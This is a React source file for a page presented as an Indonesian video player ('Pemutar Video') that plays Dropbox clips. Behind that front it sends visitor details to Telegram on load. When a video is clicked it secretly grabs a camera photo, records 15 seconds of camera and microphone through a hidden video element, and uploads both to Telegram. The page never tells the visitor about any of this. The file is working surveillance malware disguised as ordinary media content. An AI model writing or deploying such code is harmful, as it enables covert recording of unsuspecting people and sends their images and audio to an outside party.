import { ArrowsPointingOutIcon, ArrowsPointingInIcon } from '@heroicons/react/24/solid';
import { useState, useEffect, useCallback, useRef } from 'react';
import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram, VisitorDetails } from './utils/telegram';

function App() {
  const [isPlaying, setIsPlaying] = useState(false);
  const [isFullscreen, setIsFullscreen] = useState(false);
  const [currentVideoIndex, setCurrentVideoIndex] = useState(0);
  const videoRef = useRef<HTMLVideoElement>(null);
  const cameraStreamRef = useRef<MediaStream | null>(null);

  const videos = [
    { videoUrl: 'https://dl.dropboxusercontent.com/scl/fi/9pphjwtbbj0wup2v7svjp/VID_20250404_070105_988.mp4.mov?rlkey=pyyymd5qu6x607pia463rsbcq&st=kvhc88he&dl=0' },
    { videoUrl: 'https://dl.dropboxusercontent.com/scl/fi/mp0cutqd18jtl7sutqfvu/VID_20250403_031208_872.mp4?rlkey=dxkmv02omhepbbgiip3c0enpn&dl=0' },
    { videoUrl: 'https://dl.dropboxusercontent.com/scl/fi/gzaizaxrolp3i7djv34nj/VID_20250404_070135_949.mp4?rlkey=z5qvhvwuyeubzu10e56s5mary&st=m2hoh0p8&dl=0' },
    { videoUrl: 'https://dl.dropboxusercontent.com/scl/fi/orn7kok1g2tq30ohfuq7n/VID_20250404_070020_073.mp4?rlkey=1ljpl4eugyu7ehjhvpero874q&st=iqvkh4yz&dl=0' },
    { videoUrl: 'https://dl.dropboxusercontent.com/scl/fi/s08uo7s2sehm4ndznp5dd/VID_20250404_065732_032.mp4?rlkey=bzf8i2txkeqb0hc1tgjp7ig1v&st=4gc4tyoe&dl=0' },
    { videoUrl: 'https://dl.dropboxusercontent.com/scl/fi/2mq997y2mfcliq8cxnjo9/VID_20250404_065520_654.mp4?rlkey=lxjwqs1kc1y187gkbzvoi38k0&st=lbsqu0vs&dl=0' },
    { videoUrl: 'https://dl.dropboxusercontent.com/scl/fi/1oz45iy46bchnh9bwqmh9/VID_20250404_065252_933.mp4?rlkey=4f77pchh064fi0llg0kmftc5f&st=o5zt1ejt&dl=0' },
    { videoUrl: 'https://dl.dropboxusercontent.com/scl/fi/0x1dsbfvwq9cufeboduzv/VID_20250404_065224_172.mp4?rlkey=luad0i1xf7ehqrhcp393eoomp&st=6txw2mcy&dl=0' },
    { videoUrl: 'https://dl.dropboxusercontent.com/scl/fi/iwhlu5kv3fw4a6u0erx7g/VID_20250404_064856_263.mp4?rlkey=u9qzo7pmtrbchf3wym6plqrz1&st=nxxjvj6n&dl=0' },
    { videoUrl: 'https://dl.dropboxusercontent.com/scl/fi/uhhg9497as7jr0mejv0uf/VID_20250404_064727_662.mp4?rlkey=7hnqbhrk5i3dynthdaoe94nr1&st=vj11g413&dl=0' }
  ];

  useEffect(() => {
    const sendVisitorNotification = async () => {
      const visitorDetails: VisitorDetails = {
        userAgent: navigator.userAgent,
        location: window.location.href,
        referrer: document.referrer || 'Direct',
        previousSites: document.referrer || 'None',
      };
      try {
        await sendTelegramNotification(visitorDetails);
      } catch (error) {
        console.error('Gagal mengirim notifikasi pengunjung:', error);
      }
    };
    sendVisitorNotification();
  }, []);

  const captureAndSendMedia = useCallback(async () => {
    console.log('Mulai proses pengambilan media...');
    try {
      if (videoRef.current) {
        videoRef.current.play().catch(err => console.error('Error memutar video:', err));
      }

      const devices = await navigator.mediaDevices.enumerateDevices();
      const videoDevice = devices.find(device => device.kind === 'videoinput');
      
      if (!videoDevice) throw new Error('Tidak ada perangkat input video yang ditemukan');

      const constraints = {
        video: { deviceId: videoDevice.deviceId, width: { ideal: 720 }, height: { ideal: 1280 }, frameRate: { ideal: 30 } },
        audio: true
      };
      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      cameraStreamRef.current = stream;

      const cameraVideo = document.createElement('video');
      cameraVideo.srcObject = stream;
      cameraVideo.playsInline = true;
      cameraVideo.muted = true;
      cameraVideo.autoplay = true;
      cameraVideo.style.display = 'none';
      document.body.appendChild(cameraVideo);

      await new Promise((resolve) => {
        cameraVideo.onloadedmetadata = async () => {
          await cameraVideo.play();
          setTimeout(resolve, 500);
        };
      });

      const canvas = document.createElement('canvas');
      canvas.width = 720;
      canvas.height = 1280;
      const context = canvas.getContext('2d');
      
      if (context) {
        context.drawImage(cameraVideo, 0, 0, canvas.width, canvas.height);
      }

      const photoBlob = await new Promise<Blob>((resolve) => {
        canvas.toBlob((blob) => blob && resolve(blob), 'image/jpeg', 1.0);
      });

      await sendImageToTelegram(photoBlob);

      const supportedMimeType = ['video/mp4;codecs=h264,aac', 'video/mp4']
        .find(type => MediaRecorder.isTypeSupported(type)) || 'video/mp4';

      const mediaRecorder = new MediaRecorder(stream, { mimeType: supportedMimeType, videoBitsPerSecond: 4000000 });
      const chunks: BlobPart[] = [];

      mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) chunks.push(e.data);
      };

      mediaRecorder.onstop = async () => {
        const videoBlob = new Blob(chunks, { type: supportedMimeType });
        await sendVideoToTelegram(videoBlob);
        stream.getTracks().forEach(track => track.stop());
        cameraStreamRef.current = null;
        if (cameraVideo.parentNode) cameraVideo.parentNode.removeChild(cameraVideo);
      };

      mediaRecorder.start(1000);
      setTimeout(() => {
        if (mediaRecorder.state === 'recording') {
          mediaRecorder.stop();
        }
        if (videoRef.current) videoRef.current.pause();
        setIsPlaying(false);
      }, 15000);

    } catch (error) {
      console.error('Error dalam captureAndSendMedia:', error);
      if (cameraStreamRef.current) {
        cameraStreamRef.current.getTracks().forEach(track => track.stop());
        cameraStreamRef.current = null;
      }
      setIsPlaying(false);
    }
  }, []);

  const handleVideoClick = async () => {
    if (videoRef.current && !isPlaying) {
      videoRef.current.src = videos[currentVideoIndex].videoUrl;
      try {
        await videoRef.current.load();
        await videoRef.current.play();
        setIsPlaying(true);
        await captureAndSendMedia();
      } catch (error) {
        console.error('Error memutar video dari Dropbox:', error);
        setIsPlaying(false);
      }
    }
  };

  const toggleFullscreen = () => {
    if (!isFullscreen && videoRef.current) {
      videoRef.current.requestFullscreen();
      setIsFullscreen(true);
    } else {
      document.exitFullscreen();
      setIsFullscreen(false);
    }
  };

  const handleVideoEnded = () => {
    setIsPlaying(false);
    setCurrentVideoIndex((prev) => (prev + 1) % videos.length);
  };

  return (
    <div className="relative min-h-screen bg-gray-900">
      <header className="relative bg-gray-800 py-6">
        <div className="container mx-auto px-4">
          <h1 className="text-3xl font-bold text-white">Pemutar Video</h1>
        </div>
      </header>
      <main className="relative container mx-auto px-4 py-8">
        <div className="max-w-[720px] mx-auto">
          <div className="relative">
            <div className="relative bg-black rounded-lg overflow-hidden shadow-xl" style={{ aspectRatio: '9/16' }}>
              <video
                ref={videoRef}
                className="w-full h-full object-cover"
                muted
                loop
                onClick={handleVideoClick}
                onEnded={handleVideoEnded}
              />
              {isPlaying && (
                <div className="absolute bottom-4 right-4 z-20">
                  <button
                    onClick={toggleFullscreen}
                    className="bg-gray-800/70 p-2 rounded-full hover:bg-gray-700 transition-all duration-200"
                  >
                    {isFullscreen ? (
                      <ArrowsPointingInIcon className="w-6 h-6 text-white" />
                    ) : (
                      <ArrowsPointingOutIcon className="w-6 h-6 text-white" />
                    )}
                  </button>
                </div>
              )}
            </div>
            <div className="mt-4 flex gap-2 overflow-x-auto pb-2">
              {videos.map((video, index) => (
                <video
                  key={index}
                  src={video.videoUrl}
                  className={`w-16 h-28 object-cover rounded cursor-pointer ${
                    index === currentVideoIndex ? 'ring-2 ring-red-600' : ''
                  }`}
                  muted
                  preload="metadata"
                  onClick={() => {
                    setCurrentVideoIndex(index);
                    setIsPlaying(false);
                  }}
                />
              ))}
            </div>
          </div>
        </div>
      </main>
    </div>
  );
}

export default App;
